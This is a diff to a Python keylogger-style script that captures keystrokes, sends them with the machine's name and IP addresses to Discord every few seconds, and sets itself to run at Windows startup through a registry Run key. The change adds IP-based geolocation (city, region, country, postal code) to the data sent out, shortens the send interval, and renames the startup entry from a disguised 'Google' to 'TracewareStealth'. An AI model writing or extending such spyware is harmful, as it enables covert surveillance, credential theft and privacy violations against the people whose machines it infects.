@@ -32,8 +32,25 @@ def get_local_ips():
         print(f"Error fetching IP addresses: {e}")
     return ipv4, ipv6
 
+# Function to get location based on IP address
+def get_location():
+    try:
+        response = requests.get("https://ipinfo.io/json")
+        data = response.json()
+        city = data.get("city", "Unknown")
+        region = data.get("region", "Unknown")
+        country = data.get("country", "Unknown")
+        postal = data.get("postal", "Unknown")
+        return city, region, country, postal
+    except requests.exceptions.RequestException as e:
+        print(f"Error fetching location: {e}")
+        return "Unknown", "Unknown", "Unknown", "Unknown"
+
 # Get IP Addresses
 IPV4_ADDRESS, IPV6_ADDRESS = get_local_ips()
+
+# Get Location
+CITY, REGION, COUNTRY, POSTAL = get_location()
 
 # Tracking Variables
 last_logged = None
@@ -60,7 +77,8 @@ def send_to_discord(title, description, color):
 # Function to log system startup
 def log_system_start():
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    message = f"[{timestamp}] {PC_NAME} (IPv4: {IPV4_ADDRESS}, IPv6: {IPV6_ADDRESS}) - Connection Established"
+    message = (f"[{timestamp}] {PC_NAME} (IPv4: {IPV4_ADDRESS}, IPv6: {IPV6_ADDRESS}) - "
+               f"Location: {CITY}, {REGION}, {COUNTRY}, {POSTAL} - Connection Established")
     send_to_discord("SYSTEM START", message, 65280)  # Green
 
 # Function to log system shutdown
@@ -133,7 +151,7 @@ listener.start()
 # Function to periodically send keystrokes
 def keystroke_monitor():
     while True:
-        time.sleep(5)  # Check every second
+        time.sleep(3)  # Check every second
         send_keystrokes()
 
 keystroke_thread = threading.Thread(target=keystroke_monitor, daemon=True)
@@ -142,7 +160,7 @@ keystroke_thread.start()
 # Function to add the script to Windows startup
 def add_to_startup():
     key = r"Software\Microsoft\Windows\CurrentVersion\Run"
-    value_name = "Google"
+    value_name = "TracewareStealth"
     script_path = os.path.abspath(__file__)
     try:
         with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as reg_key:
